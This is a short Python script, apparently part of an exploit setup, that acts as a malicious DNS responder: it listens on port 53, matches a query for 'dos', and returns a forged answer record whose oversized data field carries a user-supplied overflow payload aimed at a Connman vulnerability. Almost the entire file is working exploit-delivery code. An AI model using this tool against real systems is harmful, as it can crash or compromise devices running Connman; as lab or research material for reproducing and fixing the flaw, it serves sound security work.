# dns_spoofer.py
import socket
import argparse

def main(payload_hex: str):
    """
    Listens for a DNS query and responds with a carefully crafted
    malicious payload to trigger the Connman vulnerability.
    """
    payload = bytes.fromhex(payload_hex)
    ip = "127.0.0.1"
    port = 53
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((ip, port))
    print(f"[SPOOFER] Listening on {ip}:{port}...")

    try:
        data, addr = sock.recvfrom(1024)
        if b'dos' not in data[12:]:
            print("[SPOOFER] Received non-target query. Exiting.")
            return

        print(f"[SPOOFER] Received query from {addr}. Crafting malicious response...")
        
        # This structure is based on successful manual exploits.
        # It ensures the packet is parsed correctly by Connman.
        packet = bytearray()
        
        # --- Header ---
        packet += data[:2]      # Transaction ID (from original query)
        packet += b'\x81\x80'    # Flags: Response, No error
        packet += b'\x00\x01'    # Questions: 1
        packet += b'\x00\x01'    # Answer RRs: 1
        packet += b'\x00\x00'    # Authority RRs: 0
        packet += b'\x00\x00'    # Additional RRs: 0
        
        # --- Question Section ---
        packet += data[12:]     # Original query (e.g., "\x03dos\x03com\x00...")
        
        # --- Answer Section (The malicious part) ---
        packet += b'\xc0\x0c'    # Pointer to the domain name in the question section
        packet += b'\x00\x01'    # Type: A (Host Address)
        packet += b'\x00\x01'    # Class: IN (Internet)
        packet += b'\x00\x00\x00\xff' # TTL: 255 seconds
        packet += len(payload).to_bytes(2, 'big') # Data length
        packet += payload       # The actual overflow payload

        sock.sendto(packet, addr)
        print(f"[SPOOFER] Malicious payload sent ({len(payload)} bytes).")

    except Exception as e:
        print(f"[SPOOFER] An error occurred: {e}")
    finally:
        sock.close()
        print("[SPOOFER] Shutting down.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofer for Connman Exploit")
    parser.add_argument("--payload", type=str, required=True, help="The exploit payload in hex format.")
    args = parser.parse_args()
    main(args.payload)